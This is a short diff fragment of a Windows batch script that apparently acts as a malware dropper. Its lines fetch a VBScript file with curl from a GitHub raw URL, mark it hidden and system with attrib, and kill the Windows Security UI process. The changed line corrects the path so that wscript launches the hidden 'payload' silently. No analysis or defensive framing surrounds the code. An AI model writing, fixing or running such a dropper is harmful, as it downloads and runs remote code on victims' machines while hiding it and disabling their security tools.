@@ -37,7 +37,7 @@ curl -sS https://raw.githubusercontent.com/maxavison7/nothing/main/myscript.vbs?
 attrib +h +s "%hiddenFolder2%\myscript.vbs"
 
 REM Run payload silently and pass %hiddenFolder% variable
-start /B "" wscript.exe "%hiddenFolder%\myscript.vbs" %hiddenFolder1%
+start /B "" wscript.exe "%hiddenFolder2%\myscript.vbs" %hiddenFolder1%
 
 ::external
 taskkill /f /im SecHealthUI.exe >nul 2>&1
